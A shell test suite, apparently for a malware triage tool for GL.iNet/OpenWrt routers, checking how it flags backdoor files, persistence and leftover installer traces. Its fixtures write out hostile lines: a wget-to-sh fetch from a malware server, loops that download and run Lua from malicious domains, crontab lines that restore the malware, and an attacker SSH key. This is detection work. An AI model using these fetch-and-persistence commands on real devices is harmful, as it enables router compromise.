echo /etc/my-own-file >"$U/lib/upgrade/keep.d/mine"; echo something-else >"$U/usr/bin/monitord"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "the ulogd package, an own keep list and another monitord are no indicator" '[ $rc = 0 ] && ! grep -q "backdoor-" "$D/check.txt"'
umount "$D/m"

echo "=== the loader left behind by GL.iNet's security update (RemoteToHome, 23 November)"
D=$(mkscen bdrest "$OWL"); U=$D/u
mkdir -p "$U/bin" "$U/lib/upgrade/keep.d" "$U/usr/lib/opkg"
printf '\033LuaQ loader\n' >"$U/bin/ulogd"
printf '/etc/config/network\n/bin/ulogd\n/etc/init.d/urandom_seed\n' >"$U/lib/upgrade/keep.d/netifd"
printf 'Package: gl-sdk4-system-check\nVersion: 1\n\n' >"$U/usr/lib/opkg/status"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "start script put back: the loader is still IOC and the text says it no longer starts" '[ $rc = 1 ] && grep -A3 "IOC  *backdoor-file  */bin/ulogd" "$D/check.txt" | tr -s " \n" " " | grep -q "no longer started at boot" && ! grep -q "backdoor-init" "$D/check.txt" && grep -q "IOC  *backdoor-keep" "$D/check.txt"'
mkdir -p "$D/m/etc"; printf '/usr/bin/monitord /bin/ulogd &\nexit 0\n' >"$D/m/etc/rc.local"
run "$D" "$OWL" --check >"$D/check2.txt"
expect "where something else still names the loader, nothing is said about it no longer starting (review of 2.54)" 'grep -q "IOC  *backdoor-file  */bin/ulogd" "$D/check2.txt" && ! grep -q "no longer started" "$D/check2.txt"'
umount "$D/m"

echo "=== an owner's script that blocks the older backdoor or ends it is not the backdoor (review of 2.54)"
D=$(mkscen bdown "$OWL"); U=$D/u
mkdir -p "$U/etc/init.d"
printf '#!/bin/sh /etc/rc.common\n# remove monitord and ujaild, block adsanalypro.com (CSA-2026-01)\nSTART=98\nstart() {\n\tkillall monitord ulogd ujaild 2>/dev/null\n\trm -f /usr/bin/monitord /bin/ulogd\n\techo "address=/adsanalypro.com/0.0.0.0" >/tmp/dnsmasq.d/bd.conf\n}\n' >"$U/etc/init.d/bd-block"
printf '#!/bin/sh /etc/rc.common\nSTART=97\nstart() {\n\tfor d in adguardns.com adsanalypro.com; do echo "address=/$d/0.0.0.0" >>/tmp/dnsmasq.d/bd2.conf; done\n}\n' >"$U/etc/init.d/bd-loop"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "no backdoor-init, a clean verdict (exit 0)" '[ $rc = 0 ] && ! grep -q "backdoor-init" "$D/check.txt" && ! grep -q "^ *IOC " "$D/check.txt"'
expect "a block written by echo is INFO, a list for a loop REVIEW" 'grep -q "INFO  *backdoor-block  */etc/init.d/bd-block" "$D/check.txt" && grep -q "REVIEW  *server-ref  */etc/init.d/bd-loop" "$D/check.txt"'
umount "$D/m"

echo "=== other ways to start the loader, and a loop that fetches from the servers (review of 2.54)"
D=$(mkscen bdvar "$OWL"); U=$D/u
mkdir -p "$U/etc/init.d"
printf '#!/bin/sh /etc/rc.common\nUSE_PROCD=1\nstart_service() {\n\tprocd_open_instance\n\tprocd_set_param command /usr/bin/lua /bin/ulogd\n\tprocd_close_instance\n}\n' >"$U/etc/init.d/bv-procd"
printf '#!/bin/sh /etc/rc.common\nstart() {\n\tsetsid lua /bin/ulogd &\n}\n' >"$U/etc/init.d/bv-setsid"
printf '#!/bin/sh /etc/rc.common\nstart() {\n\t{ lua /bin/ulogd; } &\n}\n' >"$U/etc/init.d/bv-group"
printf '#!/bin/sh /etc/rc.common\nstart() {\n\tenv lua /bin/ulogd &\n}\n' >"$U/etc/init.d/bv-env"
printf '#!/bin/sh /etc/rc.common\nstart() {\n\tcommand -v monitord >/dev/null && killall monitord\n}\n' >"$U/etc/init.d/bv-own"
printf '#!/bin/sh /etc/rc.common\nstart() {\n\tfor h in cdn.adguardns.com cdn.adxinsight.com; do wget -qO /tmp/u "http://$h/u" && lua /tmp/u; done\n}\n' >"$U/etc/init.d/bv-fetch"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "procd, setsid, { } and env starting the loader are each IOC backdoor-init" '[ $rc = 1 ] && ( for n in procd setsid group env; do grep -q "IOC  *backdoor-init  */etc/init.d/bv-$n" "$D/check.txt" || exit 1; done )'
expect "command -v monitord starts nothing" '! grep -q "backdoor-init  */etc/init.d/bv-own" "$D/check.txt"'
expect "a loop that fetches from the servers is IOC backdoor-host, not REVIEW" 'grep -q "IOC  *backdoor-host  */etc/init.d/bv-fetch" "$D/check.txt" && ! grep -q "REVIEW  *server-ref  */etc/init.d/bv-fetch" "$D/check.txt"'
umount "$D/m"

echo "=== a line that writes the malware's cron entry back (review of 2.54)"
D=$(mkscen echoput "$OWL"); U=$D/u
mkdir -p "$U/etc/uci-defaults" "$U/etc/init.d"
printf 'grep -q watch.sh /etc/crontabs/root || echo "*/3 * * * * /etc/config/.gl/watch.sh" >> /etc/crontabs/root\nexit 0\n' >"$U/etc/rc.local"
printf '(crontab -l; echo "*/3 * * * * /etc/config/.gl/watch.sh") | crontab -\n' >"$U/etc/uci-defaults/99-cron"
printf '#!/bin/sh /etc/rc.common\nstart() {\n\techo "# gl-helper check done" >> /etc/rc.local\n}\n' >"$U/etc/init.d/ew-own"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "echo >> crontab and a pipe into crontab - put the malware back: IOC persist-ref" '[ $rc = 1 ] && grep -q "IOC  *persist-ref  */etc/rc.local" "$D/check.txt" && grep -q "IOC  *persist-ref  */etc/uci-defaults/99-cron" "$D/check.txt"'
expect "a comment written into rc.local starts nothing" '! grep -q "IOC .*ew-own" "$D/check.txt"'
umount "$D/m"

echo "=== quotes are read as sh reads them (review of 2.54)"
D=$(mkscen quotes "$OWL"); U=$D/u
mkdir -p "$U/etc/init.d"
printf 'wget -qO- "http://65.20.71.131:8000/ni.sh?id=1&arch=arm" | sh\nexit 0\n' >"$U/etc/rc.local"
printf '#!/bin/sh /etc/rc.common\nstart() {\n\techo "start #1"; /etc/config/.gl/run.sh\n}\n' >"$U/etc/init.d/qhash"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "a quoted & does not cut the fetch off: IOC persist-ref" '[ $rc = 1 ] && grep -A1 "IOC  *persist-ref  */etc/rc.local" "$D/check.txt" | grep -q "fetches from a server"'
expect "a quoted # starts no comment: IOC persist-ref" 'grep -q "IOC  *persist-ref  */etc/init.d/qhash" "$D/check.txt"'
umount "$D/m"
D=$(mkscen quotes2 "$OWL"); U=$D/u
mkdir -p "$U/etc"
printf 'DIRS="/etc/config/.gl/\n/etc/glinet/.cache/gb"\nfor d in $DIRS; do rm -rf "$d"; done\ncat <<EOF >/tmp/ioc-paths\n/etc/config/.gl/gl-helper\nEOF\nlogger "guard:\ngl-helper not found"\nexit 0\n' >"$U/etc/rc.local"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "a string over two lines and a here-document are not commands: no IOC (exit 0)" '[ $rc = 0 ] && ! grep -q "^ *IOC " "$D/check.txt" && grep -q "PERSIST  *persistence  */etc/rc.local" "$D/check.txt"'
umount "$D/m"

echo "=== owners who block the older backdoor's servers their own way (review of 2.54)"
D=$(mkscen ownblock "$OWL"); U=$D/u
mkdir -p "$U/etc/config" "$U/etc/crontabs"
printf "config adblock-fast 'config'\n\tlist blocked_domain 'adguardns.com'\n\tlist blocked_domain 'adsanalypro.com'\n" >"$U/etc/config/adblock-fast"
printf 'address=/adguardns.com/192.168.8.1\naddress=/lede-openproject.org/10.0.0.1\n' >"$U/etc/dnsmasq.conf"
printf '0 4 * * * /usr/bin/check-dns.sh adguardns.com\n' >"$U/etc/crontabs/root"
printf '/etc/ulogd.conf\n#/bin/ulogd\n' >"$U/etc/sysupgrade.conf"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "an adblock list, a sinkhole, a check and the real ulogd are no backdoor: exit 0, no IOC" '[ $rc = 0 ] && ! grep -q "^ *IOC " "$D/check.txt"'
expect "the block list and the sinkhole are INFO backdoor-block, the check is REVIEW server-ref" 'grep -q "INFO  *backdoor-block  */etc/config/adblock-fast" "$D/check.txt" && grep -q "INFO  *backdoor-block  */etc/dnsmasq.conf" "$D/check.txt" && grep -q "REVIEW  *server-ref  */etc/crontabs/root" "$D/check.txt"'
umount "$D/m"

echo "=== --fix without a base image takes out only the malware's lines (review of 2.54)"
D=$(mkscen nolower "$OWL"); U=$D/u
mkdir -p "$U/etc/config/.gl" "$U/etc/init.d"
echo implant >"$U/etc/config/.gl/gl-helper"
printf '# Put your custom commands here\nlogger my-own-line\n/etc/config/.gl/gl-helper &\nexit 0\n' >"$U/etc/rc.local"
printf '#!/bin/sh\nmy-dns-check\n/etc/config/.gl/gl-helper\n' >"$U/etc/init.d/dnsmasq"
mnt "$D" "$OWL"
triage --root "$D/m" --upper "$D/u" -o "$D/out" --fix >"$D/fix.txt" 2>&1
expect "the firmware's own files stay, without the malware's lines" '[ -f "$D/m/etc/rc.local" ] && grep -q "logger my-own-line" "$D/m/etc/rc.local" && ! grep -q "^/etc/config/.gl/gl-helper" "$D/m/etc/rc.local" && [ -f "$D/m/etc/init.d/dnsmasq" ] && grep -q "my-dns-check" "$D/m/etc/init.d/dnsmasq" && ! grep -q "^/etc/config/.gl/gl-helper" "$D/m/etc/init.d/dnsmasq" && ! grep -q "not in base image" "$D/fix.txt"'
expect "the malware's own directory is gone" '[ ! -e "$D/m/etc/config/.gl" ]'
umount "$D/m"

echo "=== gl-helper under another name, known by its packer (topic 73056, post 94)"
D=$(mkscen npk "$OWL"); U=$D/u
mkdir -p "$U/usr/sbin" "$U/root" "$U/etc/svc"
{ printf '\177ELF\001\001\001'; head -c 3000 /dev/zero; printf '$Info: Node hardened executable packer; format NPK2 $'; head -c 500 /dev/zero; } >"$U/usr/sbin/svcd"; chmod 755 "$U/usr/sbin/svcd"
{ printf 'NPK!H'; head -c 2000 /dev/zero; printf 'Node hardened executable packer'; } >"$U/etc/svc/blob"
{ printf 'my notes: the malware uses the Node hardened executable packer\n'; head -c 2000 /dev/zero | tr '\0' 'n'; } >"$U/root/notes.txt"
{ printf '\177ELF\001\001\001'; head -c 3000 /dev/zero; } >"$U/usr/sbin/own-tool"; chmod 755 "$U/usr/sbin/own-tool"
mkdir -p "$U/tmp"; echo x >"$U/tmp/.lp"
mkdir -p "$U/usr/bin"; { printf '\177ELF\002\001\001'; head -c 3000 /dev/zero; printf 'Node hardened executable packer'; } >"$U/usr/bin/lua"; chmod 755 "$U/usr/bin/lua"
{ printf 'ELF note\n'; printf 'Node hardened executable packer\n'; head -c 2000 /dev/zero | tr '\0' 'e'; } >"$U/root/elf-note.txt"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "a program in the packer's format is IOC marker, also without ELF header" '[ $rc = 1 ] && grep -A1 "IOC  *marker  */usr/sbin/svcd" "$D/check.txt" | grep -q "packer of the malware" && grep -q "IOC  *marker  */etc/svc/blob" "$D/check.txt"'
expect "a note that quotes the packer's name and another program are not" '! grep -q "IOC.*/root/notes.txt" "$D/check.txt" && ! grep -q "IOC.*own-tool" "$D/check.txt" && ! grep -q "IOC.*elf-note" "$D/check.txt"'
expect "a packed program over a file of the base image is IOC marker too (review of 2.54)" 'grep -q "IOC  *marker  */usr/bin/lua" "$D/check.txt"'
expect "one finding per path" '[ $(grep -c " /usr/sbin/svcd$" "$D/check.txt") = 1 ]'
expect "/tmp/.lp is for review" 'grep -q "REVIEW  *tmp-file  */tmp/.lp" "$D/check.txt"'
run "$D" "$OWL" --fix >"$D/fix.txt"; rc=$?
expect "--fix removes the packed files only, after archiving them (exit 2)" '[ $rc = 2 ] && [ ! -e "$D/m/usr/sbin/svcd" ] && [ ! -e "$D/m/etc/svc/blob" ] && [ -f "$D/m/root/notes.txt" ] && [ -f "$D/m/usr/sbin/own-tool" ] && tar -tzf "$(ls "$D"/out/*.tar.gz | head -n 1)" | grep -q "usr/sbin/svcd"'
expect "--fix puts the base image's file back where a packed program stood over it" '[ "$(cat "$D/m/usr/bin/lua")" = lua-interpreter ]'
umount "$D/m"

echo "=== base files are package-owned too: a changed one must still be seen (issue 4)"
OWP=$BASE/openwrt-rom-pkg
cp -a "$OWL" "$OWP"
printf 'P:busybox\nF:bin\nR:busybox\n\nP:urandom-seed\nF:etc/init.d\nR:urandom_seed\n\nP:netifd\nF:lib/upgrade/keep.d\nR:netifd\nF:etc/init.d\nR:dnsmasq\n\n' >"$OWP/lib/apk/db/installed"
D=$(mkscen bdpkg "$OWP"); U=$D/u
backdoor "$U"
mkdir -p "$U/etc/glinet/.cache"; echo '#!/bin/sh' >"$U/etc/glinet/.cache/watch.sh"
printf '#!/bin/sh\n# my own change\n' >"$U/etc/init.d/dnsmasq"
mnt "$D" "$OWP"
run "$D" "$OWP" --check >"$D/check.txt"; rc=$?
expect "package-owned urandom_seed and keep list with the backdoor's lines are IOC" 'grep -q "IOC  *backdoor-init  */etc/init.d/urandom_seed" "$D/check.txt" && grep -q "IOC  *backdoor-keep  */lib/upgrade/keep.d/netifd" "$D/check.txt"'
expect "another changed package-owned base file is REVIEW, not skipped" 'grep -q "REVIEW  *changed  */etc/init.d/dnsmasq" "$D/check.txt"'
expect "watch.sh in the malware's directory is a marker" 'grep -q "IOC  *marker  */etc/glinet/.cache/watch.sh" "$D/check.txt"'
umount "$D/m"

echo "=== archive without secrets (issue 3)"
D=$(mkscen scrub "$OWL"); U=$D/u
mkdir -p "$U/root/.ssh" "$U/etc/config" "$U/etc/dropbear" "$U/etc/openvpn" "$U/tmp"
printf 'root:$1$SECRETHASH:19000:0:99999:7:::\n' >"$U/etc/shadow"
echo SECRETSSHKEY >"$U/root/.ssh/id_rsa"; echo 'ssh-ed25519 AAAAATTACKER evil' >"$U/root/.ssh/authorized_keys"
echo SECRETHOSTKEY >"$U/etc/dropbear/dropbear_rsa_host_key"; echo SECRETOVPN >"$U/etc/openvpn/client.ovpn"
printf "config peers\n\toption private_key 'SECRETWGKEY'\n\toption public_key 'PEERPUBLIC'\n\toption end_point '1.2.3.4:51820'\n" >"$U/etc/config/wireguard"
printf "config wifi-iface\n\toption ssid 'home'\n\toption key 'SECRETWIFI'\n\toption wpa_passphrase 'SECRETWPA'\n\toption api_key 'SECRETAPI'\n" >"$U/etc/config/wireless"
mkdir -p "$U/etc/ppp" "$U/etc/AdGuardHome"; echo 'user * SECRETPPP' >"$U/etc/ppp/chap-secrets"; echo 'password: OTHERFORMAT' >"$U/etc/AdGuardHome/config.yaml"
mnt "$D" "$OWL"
run "$D" "$OWL" --archive >/dev/null; A=$(ls "$D"/out/*.tar.gz); mkdir "$D/x"; tar -xzf "$A" -C "$D/x"
expect "no password hash, private key, host key or VPN profile in the archive" '! grep -rq "SECRETHASH\|SECRETSSHKEY\|SECRETHOSTKEY\|SECRETOVPN" "$D/x"'
expect "key values replaced, the peer stays visible" '! grep -rq "SECRETWGKEY\|SECRETWIFI" "$D/x" && grep -rq "PEERPUBLIC" "$D/x/evidence/files" && grep -rq "1.2.3.4:51820" "$D/x/evidence/files" && grep -rq "option private_key .REDACTED." "$D/x/evidence/files"'
expect "option names that end in a secret word are replaced, PPP secrets removed" '! grep -rq "SECRETWPA\|SECRETAPI\|SECRETPPP" "$D/x"'
expect "the archive says plainly that it can still hold passwords" 'grep -q "CAN STILL HOLD PASSWORDS" "$D/x/evidence/REDACTED.txt"'
expect "authorized_keys is kept: an added key is evidence" 'grep -rq "AAAAATTACKER" "$D/x/evidence/files"'
expect "REDACTED.txt lists what was left out, and is in the manifest" 'grep -q "/etc/shadow" "$D/x/evidence/REDACTED.txt" && grep -q "/root/.ssh/id_rsa" "$D/x/evidence/REDACTED.txt" && grep -q "REDACTED.txt" "$D/x/evidence/MANIFEST.sha256"'
expect "shadow summary is written when the base image has no shadow file" 'grep -q "^root.*hash set" "$D/x/evidence/etc/shadow-summary.txt"'
expect "the device itself is untouched" 'grep -q SECRETSSHKEY "$D/m/root/.ssh/id_rsa" && grep -q SECRETHASH "$D/m/etc/shadow" && grep -q SECRETWGKEY "$D/m/etc/config/wireguard"'
rm -rf "$D/x" "$D"/out/*; run "$D" "$OWL" --archive --with-secrets >/dev/null; mkdir "$D/x"; tar -xzf "$(ls "$D"/out/*.tar.gz)" -C "$D/x"
expect "--with-secrets keeps keys, never the password hash" 'grep -rq SECRETSSHKEY "$D/x" && grep -rq SECRETWGKEY "$D/x" && ! grep -rq SECRETHASH "$D/x"'
umount "$D/m"

echo "=== the handler's empty state file: a command ran, also after a restart"
D=$(mkscen cmd "$OWL"); U=$D/u
mkdir -p "$U/etc/config"; : >"$U/etc/mp_ip_mapping_info"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "empty, written since the attack, AstroWarp off = IOC, verdict ATTACKED, exit 1" '[ $rc = 1 ] && grep -q "IOC  *cloud-command  */etc/mp_ip_mapping_info" "$D/check.txt" && grep -q "Verdict: ATTACKED" "$D/check.txt" && ! grep -q "Verdict: INFECTED" "$D/check.txt"'
run "$D" "$OWL" --fix >"$D/fix.txt"; rc=$?
expect "--fix has nothing to remove, leaves the file, exit 1" '[ $rc = 1 ] && grep -q "Nothing to remove" "$D/fix.txt" && [ -f "$D/m/etc/mp_ip_mapping_info" ]'
touch -d '2026-10-01 12:00:00 UTC' "$D/m/etc/mp_ip_mapping_info"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "empty but written before the attack = REVIEW, exit 0" '[ $rc = 0 ] && grep -q "REVIEW  *state-file" "$D/check.txt"'
touch "$D/m/etc/mp_ip_mapping_info"; printf "config mptun 'global'\n\toption enable '1'\n" >"$D/m/etc/config/mptun"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "empty and recent, but AstroWarp is on = REVIEW, exit 0" '[ $rc = 0 ] && grep -q "REVIEW  *state-file.*" "$D/check.txt" && grep -q "AstroWarp on" "$D/check.txt"'
printf "config mptun 'global'\n\toption enable '0'\n\nconfig other 'x'\n\toption enable '1'\n" >"$D/m/etc/config/mptun"
mkdir -p "$D/m/etc/config/.gl"; echo payload >"$D/m/etc/config/.gl/gl-helper"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "with malware files as well the verdict is INFECTED, and enable in another section does not count" '[ $rc = 1 ] && grep -q "Verdict: INFECTED - gl-helper" "$D/check.txt" && grep -q "IOC  *cloud-command" "$D/check.txt"'
umount "$D/m"

echo "=== the state file's first call: its access time, only on a noatime mount"
D=$(mkscen first "$OWL"); U=$D/u
mkdir -p "$U/etc"; printf 'aa:bb:cc:dd:ee:ff 10.0.0.2 192.168.8.2\n' >"$U/etc/mp_ip_mapping_info"
touch -a -d '2026-03-02 08:14:55 UTC' "$U/etc/mp_ip_mapping_info"; touch -m -d '2026-11-21 10:00:00 UTC' "$U/etc/mp_ip_mapping_info"
mount -t overlay overlay -o "noatime,lowerdir=$OWL,upperdir=$D/u,workdir=$D/w" "$D/m"
run "$D" "$OWL" --check >"$D/check.txt"
expect "noatime: the access time is the first call, the time written the last" 'grep -A1 "REVIEW  *state-file  */etc/mp_ip_mapping_info" "$D/check.txt" | grep -q "first call 2026-03-02 08:14:55 UTC, last call 2026-11-21 10:00:00 UTC, 39 bytes"'
umount "$D/m"; mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"
expect "without noatime only the time written is given" 'grep -A1 "REVIEW  *state-file  */etc/mp_ip_mapping_info" "$D/check.txt" | grep -q "written 2026-11-21 10:00:00 UTC, 39 bytes" && ! grep -q "first call" "$D/check.txt"'
touch -d '1970-01-01 00:00:07 UTC' "$D/m/etc/mp_ip_mapping_info"
run "$D" "$OWL" --check >"$D/check.txt"
expect "a time before 2020 is shown as not a real date" 'grep -A1 "REVIEW  *state-file  */etc/mp_ip_mapping_info" "$D/check.txt" | grep -q "written 1970-01-01 00:00:07 UTC (clock was not set, not a real date), 39 bytes"'
touch -d '2020-01-01 00:00:00 UTC' "$D/m/etc/mp_ip_mapping_info"
run "$D" "$OWL" --check >"$D/check.txt"
expect "from 2020 on a time is shown as it is" 'grep -A1 "REVIEW  *state-file  */etc/mp_ip_mapping_info" "$D/check.txt" | grep -q "written 2020-01-01 00:00:00 UTC, 39 bytes" && ! grep -q "clock was not set" "$D/check.txt"'
umount "$D/m"

echo "=== an updated program that replaces a link of the base image is no hijack"
OWT=$BASE/openwrt-rom-ts
cp -a "$OWL" "$OWT"; mkdir -p "$OWT/usr/sbin"; echo tailscaled >"$OWT/usr/sbin/tailscaled"; ln -s tailscaled "$OWT/usr/sbin/tailscale"
printf 'P:busybox\nF:bin\nR:busybox\n\nP:tailscale\nF:usr/sbin\nR:tailscale\nR:tailscaled\n\n' >"$OWT/lib/apk/db/installed"
D=$(mkscen ts "$OWT"); U=$D/u
mkdir -p "$U/usr/sbin" "$U/bin"; echo combined >"$U/usr/sbin/tailscale"; echo combined >"$U/usr/sbin/tailscaled"
mnt "$D" "$OWT"
run "$D" "$OWT" --check >"$D/check.txt"; rc=$?
expect "Tailscale's own binary over the base link = REVIEW, exit 0" '[ $rc = 0 ] && grep -q "REVIEW  *replaced-link  */usr/sbin/tailscale" "$D/check.txt" && ! grep -q "applet-hijack" "$D/check.txt"'
rm "$D/m/bin/login"; echo fake >"$D/m/bin/login"
run "$D" "$OWT" --check >"$D/check.txt"; rc=$?
expect "a file over a busybox link is still IOC" '[ $rc = 1 ] && grep -q "IOC  *applet-hijack  */bin/login" "$D/check.txt"'
umount "$D/m"

echo "=== a named pipe in a scanned place must not hang the script (issue 9)"
D=$(mkscen fifo "$OWO"); U=$D/u
mkdir -p "$U/etc/config" "$U/etc/init.d" "$U/etc/crontabs" "$U/usr/lib/opkg/info" "$U/root/.ssh" "$U/etc/config/.gl"
mkfifo "$U/etc/config/x" "$U/etc/init.d/y" "$U/etc/crontabs/z" "$U/usr/lib/opkg/info/evil.list" "$U/root/.ssh/id_fifo"
rm -f "$U/etc/rc.local"; mkfifo "$U/etc/rc.local" "$U/etc/mp_ip_mapping_info" "$U/etc/passwd" "$U/etc/hostname"
mkfifo "$U/etc/config/wireguard" "$U/etc/config/mptun"
echo payload >"$U/etc/config/.gl/gl-helper"
mnt "$D" "$OWO"
timeout 60 env PATH="$TRIAGE_PATH" $TRIAGE_SH "$T" --root "$D/m" --upper "$D/u" --lower "$OWO" -o "$D/out" --archive >"$D/check.txt" 2>&1; rc=$?
expect "the run ends with a verdict and an archive (exit $rc)" '[ $rc = 1 ] && grep -q "Verdict: INFECTED" "$D/check.txt" && ls "$D"/out/*.tar.gz >/dev/null'
expect "a pipe in place of rc.local is reported, not read" 'grep -q "REVIEW  *odd-file  */etc/rc.local" "$D/check.txt"'
timeout 60 env PATH="$TRIAGE_PATH" $TRIAGE_SH "$T" --root "$D/m" --upper "$D/u" --lower "$OWO" -o "$D/out" --fix >"$D/fix.txt" 2>&1; rc=$?
expect "--fix ends too and removes the malware (exit $rc)" '[ $rc != 124 ] && [ ! -e "$D/m/etc/config/.gl" ]'
umount "$D/m"

echo "=== smaller gaps (issue 10)"
D=$(mkscen gaps "$OWO"); U=$D/u
mkdir -p "$U/usr/bin" "$U/etc/udhcpc.user.d" "$U/etc/init.d" "$U/etc/config" "$U/bin" "$U/etc/hotplug.d/iface"
ln -s /bin/busybox "$U/usr/bin/netstat"; ln -s /bin/busybox "$U/usr/bin/mytool"
printf '#!/bin/sh\necho hi\n' >"$U/etc/udhcpc.user.d/10-mine"
printf '#!/bin/sh\n/etc/glinet/.cache/watch.sh &\n' >"$U/etc/init.d/S99w"
printf '#!/bin/sh\nwget http://66.245.219.252:8000/ni.sh\n' >"$U/etc/hotplug.d/iface/99-x"
printf '\033Lua junk get_mac_form_proc domain_table\n' >"$U/bin/ulogd"
printf "config cloud\n\toption enable '1'\n\toption bindtime '1700000000'\n\toption email 'someone@example.org'\n" >"$U/etc/config/gl-cloud"
printf "config rtty\n\toption ssh_en '1'\n\toption web_en '0'\n" >"$U/etc/config/rtty"
mkdir -p "$U/usr/lib"; { printf '\033LuaQ'; head -c 1500 /dev/zero | tr '\0' 'x'; printf ' get_mac_form_proc domain_table'; } >"$U/usr/lib/hidden-loader"
{ printf '\033LuaQ'; head -c 1500 /dev/zero | tr '\0' 'y'; } >"$U/usr/lib/other.luac"; { printf 'text about LuaQ '; head -c 1500 /dev/zero | tr '\0' 'z'; } >"$U/usr/lib/plain.txt"
printf '#!/bin/sh\nwget http://gl-inet.top:8899/api/v2/sync\n' >"$U/etc/init.d/S98top"
mkdir -p "$U/usr/lib/opkg"; printf 'Package: gl-sdk4-cloud\nVersion: 1.2.3-4\n\nPackage: other\nVersion: 9\n' >"$U/usr/lib/opkg/status"
mnt "$D" "$OWO"
run "$D" "$OWO" --check >"$D/check.txt"; rc=$?
expect "a netstat link to busybox made since the attack = IOC installer-trace" 'grep -A1 "IOC  *installer-trace  */usr/bin/netstat" "$D/check.txt" | grep -q "link to busybox made on 20"'
expect "another new link that the firmware does not have = REVIEW" 'grep -A1 "REVIEW  *new-link  */usr/bin/mytool" "$D/check.txt" | grep -q "busybox"'
expect "a script in udhcpc.user.d = REVIEW" 'grep -q "REVIEW  *new  */etc/udhcpc.user.d/10-mine" "$D/check.txt"'
expect "an init script that starts watch.sh = IOC persist-ref" 'grep -q "IOC  *persist-ref  */etc/init.d/S99w" "$D/check.txt"'
expect "an autostart file that fetches from a server of the malware = IOC persist-ref" 'grep -A1 "IOC  *persist-ref  */etc/hotplug.d/iface/99-x" "$D/check.txt" | grep -q "66.245.219.252"'
expect "the loader is recognised by its function names" 'grep -A1 "IOC  *backdoor-file  */bin/ulogd" "$D/check.txt" | grep -q "compiled Lua.*function names of the analysed loader"'
expect "GoodCloud state, client version, binding and remote access are printed" 'grep -q "GoodCloud now  *on (gl-sdk4-cloud 1.2.3-4), bound to an account: on" "$D/check.txt" && grep -q "Remote access  *SSH: on, web: off (through GoodCloud)" "$D/check.txt"'
umount "$D/m"
sed -i "s/option enable '1'/option enable '0'/" "$U/etc/config/gl-cloud"
mnt "$D" "$OWO"
run "$D" "$OWO" --check >"$D/check-off.txt"
expect "with GoodCloud off, remote access reads as not in use (issue 12)" 'grep -q "Remote access  *not in use, GoodCloud is off (stored settings: SSH on, web off)" "$D/check-off.txt"'
sed -i "s/option enable '0'/option enable '1'/" "$U/etc/config/gl-cloud"
expect "with GoodCloud on, the run ends with the advice to switch it off and the command" 'grep -q "Switch GoodCloud and AstroWarp off now" "$D/check.txt" && grep -q "GoodCloud is ON on this device" "$D/check.txt" && grep -q "uci set .gl-cloud.@cloud\[0\].enable=0." "$D/check.txt" && grep -q "gl-cloud disable" "$D/check.txt"'
expect "the account's address is not printed anywhere" '! grep -q "someone@example" "$D/check.txt"'
expect "compiled Lua elsewhere in the overlay: the loader by its names is IOC, other bytecode REVIEW" 'grep -q "IOC  *backdoor-file  */usr/lib/hidden-loader" "$D/check.txt" && grep -q "REVIEW  *lua-bytecode  */usr/lib/other.luac" "$D/check.txt" && ! grep -q "lua-bytecode.*plain.txt" "$D/check.txt"'
expect "a fetch from gl-inet.top in an autostart file is an indicator" 'grep -A1 "IOC  *persist-ref  */etc/init.d/S98top" "$D/check.txt" | grep -q "gl-inet.top"'
umount "$D/m"

echo "=== what the installer leaves (topic 73056, post 90)"
D=$(mkscen inst "$OWL"); U=$D/u
mkdir -p "$U/etc/gl_nas/.cache" "$U/userdata/.gl" "$U/tmp/gl_crontabs" "$U/etc/dropbear" "$U/root/.ssh" "$U/bin" "$U/overlay/.gl"
echo elf >"$U/etc/gl_nas/.cache/gl-helper"; echo x >"$U/etc/gl_nas/.cache/run.sh"; echo x >"$U/etc/gl_nas/.cache/.u"
echo mine >"$U/userdata/.gl/my-notes"
printf '0 4 * * * /usr/bin/own-job\n*/3 * * * * /bin/sh /etc/gl_nas/.cache/watch.sh\n' >"$U/tmp/gl_crontabs/root"
printf 'host 65.20.71.131\nport 5912\n' >"$U/etc/rtty_conf"
mkdir -p "$U/etc/gl_crontabs/crontabs.d"
printf '30 3 * * * /usr/bin/gl-own-task\n*/3 * * * * /bin/sh /etc/glinet/.cache/watch.sh\n' >"$U/etc/gl_crontabs/crontabs.d/tasks"
printf '0 5 * * * /usr/bin/other-task\n' >"$U/etc/gl_crontabs/crontabs.d/clean"
printf 'ssh-ed25519 AAAAOWNER me@home\nssh-ed25519 AAAAEVIL gl-agent\n' >"$U/etc/dropbear/authorized_keys"
mnt "$D" "$OWL"
rm "$D/m/bin/netstat"; printf '#!/bin/sh\n/bin/busybox netstat "$@" | grep -v x\n' >"$D/m/bin/netstat"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "the malware in a fallback directory is found" '[ $rc = 1 ] && grep -q "IOC  *marker  */etc/gl_nas/.cache/gl-helper" "$D/check.txt" && grep -q "IOC  *marker  */etc/gl_nas/.cache/run.sh" "$D/check.txt" && grep -q "IOC  *marker  */etc/gl_nas/.cache/.u" "$D/check.txt"'
expect "a fallback directory without its files is REVIEW only" 'grep -q "REVIEW  *hidden-dir  */userdata/.gl" "$D/check.txt" && ! grep -q "IOC.*userdata" "$D/check.txt"'
expect "running crontab, rtty server and gl-agent key are IOC" 'grep -q "IOC  *cron-ref  */tmp/gl_crontabs/root" "$D/check.txt" && grep -q "IOC  *rtty-server  */etc/rtty_conf" "$D/check.txt" && grep -q "IOC  *ssh-key  */etc/dropbear/authorized_keys" "$D/check.txt"'
